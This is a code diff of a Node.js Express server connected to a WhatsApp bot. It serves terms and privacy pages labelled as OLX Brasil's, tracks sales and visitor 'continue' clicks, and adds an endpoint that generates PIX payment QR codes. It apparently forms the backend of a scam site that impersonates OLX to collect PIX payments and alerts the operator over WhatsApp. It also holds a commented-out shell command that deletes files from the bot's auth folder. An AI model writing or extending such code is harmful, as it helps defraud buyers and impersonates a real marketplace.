@@ -13,8 +13,7 @@ const pino = require("pino");
 // const fs = require("fs");
 
 const config = require("./config.json");
-
-const destinatario = config.destinoJid
+const destinatario = config.groupDestino;
 
 async function connectToWhatsApp() {
   try {
@@ -49,13 +48,13 @@ async function connectToWhatsApp() {
         isConnected = true;
         console.log("Conectado ao WhatsApp");
         conn.sendMessage(destinatario, {
-          text: "*Conexão estabelecida com sucesso!* 1",
+          text: "*Conexão estabelecida com sucesso!*",
         });
 
-        const { exec } = require("child_process");
-        exec(
-          "cd bot/auth_info_baileys && find . ! -name 'creds.json' -type f -exec rm -f {} +"
-        );
+        // const { exec } = require("child_process");
+        // exec(
+        //   "cd bot/auth_info_baileys && find . ! -name 'creds.json' -type f -exec rm -f {} +"
+        // );
       }
 
       // Se desconectado
@@ -92,7 +91,8 @@ async function connectToWhatsApp() {
         if (mek.key.fromMe) return;
         if (mek.key && mek.key.remoteJid === "status@broadcast") return;
 
-        require("./bot/system/admins")(conn, mek, dataVendas, config);
+        console.log("Mensagem recebida:", mek);
+        require("./bot/system/admins")(conn, mek, dataVendas);
       } catch (error) {
         console.error("Erro ao processar mensagem:", error);
       }
@@ -207,6 +207,10 @@ async function enviarArquivoWhatsApp(filePath, caption) {
       console.error("WhatsApp não está conectado. Status:", isConnected);
       return { success: false, message: "WhatsApp não está conectado" };
     }
+
+    // ID do grupo ou contato (pode ser alterado conforme necessário)
+    // const destinatario = "120363397924256528@g.us"; // ID do grupo
+
     // Verificar se o arquivo existe
     if (!fs.existsSync(filePath)) {
       console.error(`Arquivo não encontrado: ${filePath}`);
@@ -393,7 +397,7 @@ app.get("/api/vendas", (req, res) => {
 app.get("/api/termos", (req, res) => {
   res.json({
     titulo: "Termos de Uso da OLX Brasil",
-    atualizado: "01/04/2025",
+    atualizado: "01/04/2023",
     conteudo: "Este documento apresenta os termos e condições gerais...",
   });
 });
@@ -402,7 +406,7 @@ app.get("/api/termos", (req, res) => {
 app.get("/api/privacidade", (req, res) => {
   res.json({
     titulo: "Política de Privacidade da OLX Brasil",
-    atualizado: "01/04/2025",
+    atualizado: "01/04/2023",
     conteudo: "A OLX Brasil está comprometida em proteger sua privacidade...",
   });
 });
@@ -539,6 +543,39 @@ app.post("/api/notificar-clique-continuar", async (req, res) => {
       success: false,
       message: "Erro ao processar sua solicitação",
       error: error.message,
+    });
+  }
+});
+
+// Importar o módulo qrcodepagamentos
+const qrcodePagamentos = require('./js/qrcodepagamentos');
+
+// Endpoint para gerar QR Code PIX
+app.get("/api/gerar-qrcode-pix", async (req, res) => {
+  try {
+    console.log("Gerando QR Code PIX...");
+    const resultado = await qrcodePagamentos.gerarQRCode();
+    
+    if (!resultado || !resultado.imgBase64) {
+      console.error("Erro ao gerar QR Code PIX: Resultado inválido");
+      return res.status(500).json({
+        success: false,
+        message: "Não foi possível gerar o QR Code PIX",
+        resultado
+      });
+    }
+    
+    res.json({
+      success: true,
+      qrCodeBase64: resultado.imgBase64,
+      pixTitle: resultado.pixTitle
+    });
+  } catch (error) {
+    console.error("Erro ao gerar QR Code PIX:", error);
+    res.status(500).json({
+      success: false,
+      message: "Erro ao gerar QR Code PIX",
+      error: error.message
     });
   }
 });
